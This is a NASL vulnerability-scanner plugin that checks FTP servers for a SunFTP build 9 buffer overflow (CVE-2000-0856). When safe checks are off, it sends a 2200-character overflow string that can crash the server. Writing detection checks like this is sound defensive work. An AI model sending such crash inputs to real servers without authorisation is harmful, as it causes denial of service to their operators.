if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11373" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 1638 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2000-0856" );
	script_name( "SunFTP Buffer Overflow" );
	script_category( ACT_MIXED_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "FTP" );
	script_copyright( "Copyright (C) 2003 Xue Yong Zhi" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ftp/sunftp/detected" );
	script_tag( name: "summary", value: "Buffer overflow in SunFTP build 9(1) allows remote attackers to cause
  a denial of service or possibly execute arbitrary commands by sending
  more than 2100 characters to the server." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
port = ftp_get_port( default: 21 );
banner = ftp_get_banner( port: port );
if(!banner || !ContainsString( banner, "SunFTP " )){
	exit( 0 );
}
if(safe_checks()){
	if(ContainsString( banner, "SunFTP b9" )){
		security_message( port: port );
	}
	exit( 0 );
}
soc = open_sock_tcp( port );
if(soc){
	send( socket: soc, data: NASLString( "help\\r\\n" ) );
	b = ftp_recv_line( socket: soc );
	if(!b){
		exit( 0 );
	}
	if(!ContainsString( b, "SunFTP" )){
		exit( 0 );
	}
	close( soc );
	soc = open_sock_tcp( port );
	longstring = NASLString( crap( 2200 ) );
	send( socket: soc, data: NASLString( longstring, "\\r\\n" ) );
	b = ftp_recv_line( socket: soc );
	if( !b ){
		security_message( port );
		exit( 0 );
	}
	else {
		ftp_close( socket: soc );
	}
}

